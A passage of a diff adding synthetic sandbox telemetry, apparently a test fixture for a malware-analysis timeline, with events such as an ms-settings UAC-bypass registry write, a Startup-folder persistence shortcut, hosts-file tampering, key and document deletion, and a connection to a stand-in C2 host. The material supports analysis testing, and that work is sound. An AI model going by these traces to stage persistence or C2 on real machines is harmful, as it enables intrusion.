+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "9478fc3cc6836d293541aa7e",
+  "time": "2026-10-13T15:39:58.846Z",
+  "sequence": 43,
+  "lane": "registry",
+  "kind": "event",
+  "category": [
+   "registry"
+  ],
+  "action": "registry-value-read",
+  "module": "capemon",
+  "dataset": "capemon.registry",
+  "summary": "benign.exe read HKLM\\SOFTWARE\\Microsoft\\Cryptography\\MachineGuid",
+  "severity": null,
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": "HKLM\\SOFTWARE\\Microsoft\\Cryptography\\MachineGuid"
+ },
+ {
+  "id": "076f0e7f4691c276c4cc233f",
+  "time": "2026-10-13T15:39:59.131Z",
+  "sequence": 44,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtClose",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "cmd.exe called NtClose \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": "NtClose",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "f5f9c30cad1c20e75c7973a0",
+  "time": "2026-10-13T15:39:59.417Z",
+  "sequence": 45,
+  "lane": "registry",
+  "kind": "event",
+  "category": [
+   "registry"
+  ],
+  "action": "registry-value-set",
+  "module": "capemon",
+  "dataset": "capemon.registry",
+  "summary": "notepad.exe set HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command\\(Default)",
+  "severity": null,
+  "process": {
+   "pid": 3120,
+   "name": "notepad.exe",
+   "entity_id": "45:3120@1760370395"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": "HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command\\(Default)"
+ },
+ {
+  "id": "3a8a2cb476d5ae8c0f50b619",
+  "time": "2026-10-13T15:39:59.572Z",
+  "sequence": 46,
+  "lane": "network",
+  "kind": "event",
+  "category": [
+   "network"
+  ],
+  "action": "dns-query",
+  "module": "capemon",
+  "dataset": "capemon.network",
+  "summary": "cmd.exe resolved time.windows.com \u2192 192.168.150.1",
+  "severity": null,
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": {
+   "ip": "192.168.150.1",
+   "port": 53,
+   "domain": "time.windows.com"
+  },
+  "dns_query": "time.windows.com",
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "9aa5fa662a40240de64296c2",
+  "time": "2026-10-13T15:39:59.880Z",
+  "sequence": 47,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtProtectVirtualMemory",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "benign.exe called NtProtectVirtualMemory \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": "NtProtectVirtualMemory",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "ff9f356a040cd201f1f4856c",
+  "time": "2026-10-13T15:40:00.161Z",
+  "sequence": 48,
+  "lane": "process",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "process-terminated",
+  "module": "capemon",
+  "dataset": "capemon.process",
+  "summary": "explorer.exe terminated",
+  "severity": null,
+  "process": {
+   "pid": 1020,
+   "name": "explorer.exe",
+   "entity_id": "45:1020@1760370000"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "0a5fb11115297a991999d537",
+  "time": "2026-10-13T15:40:00.397Z",
+  "sequence": 49,
+  "lane": "memory",
+  "kind": "event",
+  "category": [
+   "memory"
+  ],
+  "action": "memory-finding",
+  "module": "volatility3",
+  "dataset": "volatility3.malfind",
+  "summary": "malfind: RWX region in svchost.exe at 0x7ff67ae8a000",
+  "severity": null,
+  "process": {
+   "pid": 4412,
+   "name": "svchost.exe",
+   "entity_id": "45:4412@1760369000"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "be7d0507dbfb3534fd918e74",
+  "time": "2026-10-13T15:40:00.533Z",
+  "sequence": 50,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtQueryAttributesFile",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "notepad.exe called NtQueryAttributesFile \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 3120,
+   "name": "notepad.exe",
+   "entity_id": "45:3120@1760370395"
+  },
+  "api_name": "NtQueryAttributesFile",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "77db8e4eff3d9080c4a04daf",
+  "time": "2026-10-13T15:40:00.770Z",
+  "sequence": 51,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtSetInformationFile",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "explorer.exe called NtSetInformationFile \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 1020,
+   "name": "explorer.exe",
+   "entity_id": "45:1020@1760370000"
+  },
+  "api_name": "NtSetInformationFile",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "31b34f135516c181d73fe681",
+  "time": "2026-10-13T15:40:00.848Z",
+  "sequence": 52,
+  "lane": "file",
+  "kind": "event",
+  "category": [
+   "file"
+  ],
+  "action": "file-written",
+  "module": "capemon",
+  "dataset": "capemon.file",
+  "summary": "cmd.exe wrote C:\\Users\\Analyst\\Desktop\\readme.txt",
+  "severity": null,
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": "C:\\Users\\Analyst\\Desktop\\readme.txt",
+  "registry_path": null
+ },
+ {
+  "id": "e642edfd6619c544118240df",
+  "time": "2026-10-13T15:40:01.163Z",
+  "sequence": 53,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtSetInformationFile",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "benign.exe called NtSetInformationFile \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": "NtSetInformationFile",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "1071eab471b0712339ba9e77",
+  "time": "2026-10-13T15:40:01.311Z",
+  "sequence": 54,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtCreateFile",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "explorer.exe called NtCreateFile \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 1020,
+   "name": "explorer.exe",
+   "entity_id": "45:1020@1760370000"
+  },
+  "api_name": "NtCreateFile",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "559a3557fbb261bc7a4b5fb8",
+  "time": "2026-10-13T15:40:01.560Z",
+  "sequence": 55,
+  "lane": "process",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "process-terminated",
+  "module": "capemon",
+  "dataset": "capemon.process",
+  "summary": "benign.exe terminated",
+  "severity": null,
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "b55ad9a1f4a91005655dd29e",
+  "time": "2026-10-13T15:40:01.860Z",
+  "sequence": 56,
+  "lane": "file",
+  "kind": "event",
+  "category": [
+   "file"
+  ],
+  "action": "file-read",
+  "module": "capemon",
+  "dataset": "capemon.file",
+  "summary": "benign.exe read C:\\Users\\Analyst\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.lnk",
+  "severity": null,
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": "C:\\Users\\Analyst\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.lnk",
+  "registry_path": null
+ },
+ {
+  "id": "066165c41da7acf8784f116e",
+  "time": "2026-10-13T15:40:01.957Z",
+  "sequence": 57,
+  "lane": "network",
+  "kind": "event",
+  "category": [
+   "network"
+  ],
+  "action": "dns-query",
+  "module": "capemon",
+  "dataset": "capemon.network",
+  "summary": "benign.exe resolved tartarus-selftest.example \u2192 192.168.150.1",
+  "severity": null,
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": {
+   "ip": "192.168.150.1",
+   "port": 53,
+   "domain": "tartarus-selftest.example"
+  },
+  "dns_query": "tartarus-selftest.example",
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "637c34b2a5ab1e51b91e16a2",
+  "time": "2026-10-13T15:40:02.023Z",
+  "sequence": 58,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtCreateFile",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "svchost.exe called NtCreateFile \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 4412,
+   "name": "svchost.exe",
+   "entity_id": "45:4412@1760369000"
+  },
+  "api_name": "NtCreateFile",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "d12dcdb905b27356dea622df",
+  "time": "2026-10-13T15:40:02.230Z",
+  "sequence": 59,
+  "lane": "registry",
+  "kind": "event",
+  "category": [
+   "registry"
+  ],
+  "action": "registry-value-read",
+  "module": "capemon",
+  "dataset": "capemon.registry",
+  "summary": "explorer.exe read HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater",
+  "severity": null,
+  "process": {
+   "pid": 1020,
+   "name": "explorer.exe",
+   "entity_id": "45:1020@1760370000"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater"
+ },
+ {
+  "id": "2d109046ab16554ed5db254d",
+  "time": "2026-10-13T15:40:02.270Z",
+  "sequence": 60,
+  "lane": "registry",
+  "kind": "event",
+  "category": [
+   "registry"
+  ],
+  "action": "registry-value-read",
+  "module": "capemon",
+  "dataset": "capemon.registry",
+  "summary": "benign.exe read HKLM\\SOFTWARE\\Microsoft\\Cryptography\\MachineGuid",
+  "severity": null,
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": "HKLM\\SOFTWARE\\Microsoft\\Cryptography\\MachineGuid"
+ },
+ {
+  "id": "cd9510483af66070e5b5c515",
+  "time": "2026-10-13T15:40:02.683Z",
+  "sequence": 61,
+  "lane": "file",
+  "kind": "event",
+  "category": [
+   "file"
+  ],
+  "action": "file-deleted",
+  "module": "capemon",
+  "dataset": "capemon.file",
+  "summary": "cmd.exe deleted C:\\ProgramData\\Microsoft\\Crypto\\RSA\\MachineKeys\\f686aace6942fb7f7ceb231212eef4a4_0a7bd2e3",
+  "severity": null,
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": "C:\\ProgramData\\Microsoft\\Crypto\\RSA\\MachineKeys\\f686aace6942fb7f7ceb231212eef4a4_0a7bd2e3",
+  "registry_path": null
+ },
+ {
+  "id": "5b115348b55d5e309fd731db",
+  "time": "2026-10-13T15:40:02.857Z",
+  "sequence": 62,
+  "lane": "network",
+  "kind": "event",
+  "category": [
+   "network"
+  ],
+  "action": "connection-opened",
+  "module": "capemon",
+  "dataset": "capemon.network",
+  "summary": "cmd.exe connected to c2.evil-updates.net:443",
+  "severity": null,
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": {
+   "ip": "203.0.113.16",
+   "port": 443,
+   "domain": "c2.evil-updates.net"
+  },
+  "dns_query": null,
+  "url": "https://c2.evil-updates.net/gate.php?id=7166",
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "9b566199119adc47bec4338d",
+  "time": "2026-10-13T15:40:03.248Z",
+  "sequence": 63,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtClose",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "benign.exe called NtClose \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": "NtClose",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "81ae5a1e699452692207adb0",
+  "time": "2026-10-13T15:40:03.408Z",
+  "sequence": 64,
+  "lane": "file",
+  "kind": "event",
+  "category": [
+   "file"
+  ],
+  "action": "file-deleted",
+  "module": "capemon",
+  "dataset": "capemon.file",
+  "summary": "svchost.exe deleted C:\\Users\\Analyst\\Documents\\invoice_2026-09.docx",
+  "severity": null,
+  "process": {
+   "pid": 4412,
+   "name": "svchost.exe",
+   "entity_id": "45:4412@1760369000"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": "C:\\Users\\Analyst\\Documents\\invoice_2026-09.docx",
+  "registry_path": null
+ },
+ {
+  "id": "759a06281422de6a41b0a023",
+  "time": "2026-10-13T15:40:03.685Z",
+  "sequence": 65,
+  "lane": "process",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "process-terminated",
+  "module": "capemon",
+  "dataset": "capemon.process",
+  "summary": "cmd.exe terminated",
+  "severity": null,
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "7edd1ebb99837b425de10525",
+  "time": "2026-10-13T15:40:03.885Z",
+  "sequence": 66,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtQueryAttributesFile",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "cmd.exe called NtQueryAttributesFile \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": "NtQueryAttributesFile",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "2ba47cea56e31931076a64a0",
+  "time": "2026-10-13T15:40:04.282Z",
+  "sequence": 67,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtOpenKey",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "cmd.exe called NtOpenKey \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": "NtOpenKey",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "68bb4834af2c9d0353089dd7",
+  "time": "2026-10-13T15:40:04.536Z",
+  "sequence": 68,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtOpenProcess",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "explorer.exe called NtOpenProcess \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 1020,
+   "name": "explorer.exe",
+   "entity_id": "45:1020@1760370000"
+  },
+  "api_name": "NtOpenProcess",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "32654fd34c3bff839269b57b",
+  "time": "2026-10-13T15:40:04.659Z",
+  "sequence": 69,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtSetInformationFile",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "cmd.exe called NtSetInformationFile \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": "NtSetInformationFile",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "c57f9bd8cc3a1d73b17bb954",
+  "time": "2026-10-13T15:40:04.775Z",
+  "sequence": 70,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtCreateFile",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "notepad.exe called NtCreateFile \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 3120,
+   "name": "notepad.exe",
+   "entity_id": "45:3120@1760370395"
+  },
+  "api_name": "NtCreateFile",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "9dea7d8a96155da600b510c7",
+  "time": "2026-10-13T15:40:04.880Z",
+  "sequence": 71,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtWriteFile",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "explorer.exe called NtWriteFile \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 1020,
+   "name": "explorer.exe",
+   "entity_id": "45:1020@1760370000"
+  },
+  "api_name": "NtWriteFile",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "0b2e90ebe95b75cc54f3bfb7",
+  "time": "2026-10-13T15:40:04.986Z",
+  "sequence": 72,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtReadFile",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "benign.exe called NtReadFile \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": "NtReadFile",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "e89dfda6f5aed7aaeda47a95",
+  "time": "2026-10-13T15:40:05.329Z",
+  "sequence": 73,
+  "lane": "registry",
+  "kind": "event",
+  "category": [
+   "registry"
+  ],
+  "action": "registry-value-read",
+  "module": "capemon",
+  "dataset": "capemon.registry",
+  "summary": "cmd.exe read HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command\\(Default)",
+  "severity": null,
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": "HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command\\(Default)"
+ },
+ {
+  "id": "447972e3b930815e47e6f075",
+  "time": "2026-10-13T15:40:05.393Z",
+  "sequence": 74,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "GetSystemTimeAsFileTime",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "explorer.exe called GetSystemTimeAsFileTime \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 1020,
+   "name": "explorer.exe",
+   "entity_id": "45:1020@1760370000"
+  },
+  "api_name": "GetSystemTimeAsFileTime",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "96619a673658a19ec2e07c6c",
+  "time": "2026-10-13T15:40:05.798Z",
+  "sequence": 75,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtWriteFile",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "benign.exe called NtWriteFile \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": "NtWriteFile",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "6ef0a09c9d1c583d604c186e",
+  "time": "2026-10-13T15:40:06.124Z",
+  "sequence": 76,
+  "lane": "file",
+  "kind": "event",
+  "category": [
+   "file"
+  ],
+  "action": "file-written",
+  "module": "capemon",
+  "dataset": "capemon.file",
+  "summary": "benign.exe wrote C:\\Users\\Analyst\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.lnk",
+  "severity": null,
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": "C:\\Users\\Analyst\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.lnk",
+  "registry_path": null
+ },
+ {
+  "id": "31a1720e4748d2ea02c984f7",
+  "time": "2026-10-13T15:40:06.463Z",
+  "sequence": 77,
+  "lane": "network",
+  "kind": "event",
+  "category": [
+   "network"
+  ],
+  "action": "dns-query",
+  "module": "capemon",
+  "dataset": "capemon.network",
+  "summary": "benign.exe resolved c2.evil-updates.net \u2192 192.168.150.1",
+  "severity": null,
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": {
+   "ip": "192.168.150.1",
+   "port": 53,
+   "domain": "c2.evil-updates.net"
+  },
+  "dns_query": "c2.evil-updates.net",
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "4a755d555ea4cc9e2b042a07",
+  "time": "2026-10-13T15:40:06.699Z",
+  "sequence": 78,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtCreateFile",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "svchost.exe called NtCreateFile \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 4412,
+   "name": "svchost.exe",
+   "entity_id": "45:4412@1760369000"
+  },
+  "api_name": "NtCreateFile",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "61f0bed68b3214a1304efa4a",
+  "time": "2026-10-13T15:40:06.828Z",
+  "sequence": 79,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtQuerySystemInformation",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "benign.exe called NtQuerySystemInformation \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": "NtQuerySystemInformation",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "6672ae4828ff1cc70e8dffc3",
+  "time": "2026-10-13T15:40:07.054Z",
+  "sequence": 80,
+  "lane": "registry",
+  "kind": "event",
+  "category": [
+   "registry"
+  ],
+  "action": "registry-value-set",
+  "module": "capemon",
+  "dataset": "capemon.registry",
+  "summary": "cmd.exe set HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU\\a",
+  "severity": null,
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU\\a"
+ },
+ {
+  "id": "af42a5f3b065153135d88960",
+  "time": "2026-10-13T15:40:07.197Z",
+  "sequence": 81,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "CryptAcquireContextW",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "benign.exe called CryptAcquireContextW \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": "CryptAcquireContextW",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "795bb9de4ee5396006a5aa43",
+  "time": "2026-10-13T15:40:07.477Z",
+  "sequence": 82,
+  "lane": "file",
+  "kind": "event",
+  "category": [
+   "file"
+  ],
+  "action": "file-written",
+  "module": "capemon",
+  "dataset": "capemon.file",
+  "summary": "svchost.exe wrote C:\\Windows\\System32\\drivers\\etc\\hosts",
+  "severity": null,
+  "process": {
+   "pid": 4412,
+   "name": "svchost.exe",
+   "entity_id": "45:4412@1760369000"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": "C:\\Windows\\System32\\drivers\\etc\\hosts",
+  "registry_path": null
+ },
+ {
+  "id": "95d6c658a0fc5a65fa254dc1",
+  "time": "2026-10-13T15:40:07.506Z",
+  "sequence": 83,
+  "lane": "network",
+  "kind": "event",
+  "category": [
+   "network"
+  ],
+  "action": "dns-query",
+  "module": "capemon",
+  "dataset": "capemon.network",
+  "summary": "notepad.exe resolved time.windows.com \u2192 192.168.150.1",
+  "severity": null,
+  "process": {
+   "pid": 3120,
+   "name": "notepad.exe",
+   "entity_id": "45:3120@1760370395"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": {
+   "ip": "192.168.150.1",
+   "port": 53,
+   "domain": "time.windows.com"
+  },
+  "dns_query": "time.windows.com",
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "eba252e169c4a99dc5aac38c",
+  "time": "2026-10-13T15:40:07.696Z",
+  "sequence": 84,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtCreateFile",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "cmd.exe called NtCreateFile \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 2476,
